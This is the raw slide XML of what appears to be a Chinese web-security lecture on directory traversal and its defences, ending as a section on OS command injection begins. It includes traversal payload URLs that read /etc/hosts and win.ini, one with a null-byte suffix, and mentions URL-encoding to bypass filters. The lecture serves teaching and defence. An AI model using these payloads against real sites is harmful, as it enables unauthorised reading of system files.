        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>目录遍历</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目录遍历</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1026245" y="1277072"/>
            <a:ext cx="6678613" cy="3067916"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743094" y="4945466"/>
            <a:ext cx="7244917" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.cn/example/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>ex.php?template</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>=../../../../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>/hosts%00</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>将显示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/hosts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>文件内容</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>目录遍历</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462852" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1557338"/>
            <a:ext cx="8064500" cy="955675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.acmehackme.com/online/getnews.asp?item=20March2007.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462853" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="3933825"/>
            <a:ext cx="8064500" cy="955675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.acmehackme.com/online/getnews.asp?item=../../../../windows/win.ini</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462854" name="AutoShape 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4067175" y="2924175"/>
            <a:ext cx="431800" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 41636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0000FF"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462855" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1042988" y="2997200"/>
            <a:ext cx="1800225" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 16843"/>
              <a:gd name="adj2" fmla="val -119028"/>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latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>提交申请获取某个新闻网页文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462856" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="5445125"/>
            <a:ext cx="1800225" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -15963"/>
              <a:gd name="adj2" fmla="val -125102"/>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latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Batang" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>从当前目录跳到上一级目录 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462857" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3492500" y="5373688"/>
            <a:ext cx="2735263" cy="935037"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -49185"/>
              <a:gd name="adj2" fmla="val -98727"/>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latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>目录遍历成功将读取到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>目录下的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>win.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>文件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">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62852"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46285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462855"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46285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62854"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="462854"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="18" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="19" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="462853"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="462853"/>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462856"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46285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462857"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="462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2" grpId="0" animBg="1"/>
      <p:bldP spid="462853" grpId="0" animBg="1"/>
      <p:bldP spid="462854" grpId="0" animBg="1"/>
      <p:bldP spid="462855" grpId="0" animBg="1"/>
      <p:bldP spid="462856" grpId="0" animBg="1"/>
      <p:bldP spid="46285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89540" y="1263218"/>
            <a:ext cx="8138824" cy="4832781"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>避免由外界指定文件名</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>将文件名固定，保存在会话变量中，不直接指定文件名，而是使用编号等方法间接指定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>文件名中不允许包含目录名</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>不同系统中表示目录的字符有所不同，常见的有：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>限定文件中仅包含字母或数字</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>有些攻击使用不同的编码转换进行过滤性的绕过，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过对参数进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>编码来绕过检查</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>目录遍历防御</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1659443" y="5857382"/>
            <a:ext cx="5999018" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>downfile.jsp?filename</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>= %66%61%6E%2E%70%64%66</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="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5812325" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>六、操作系统命令注入及防范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8" y="1457181"/>
            <a:ext cx="8069551" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>很多</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用编程语言支持应用通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>执行操作系统（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）命令。通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令，或开发中用到的某个方法在其内部使用了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，就有可能出现恶意利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>提供的功能来任意执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令的情况，这就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
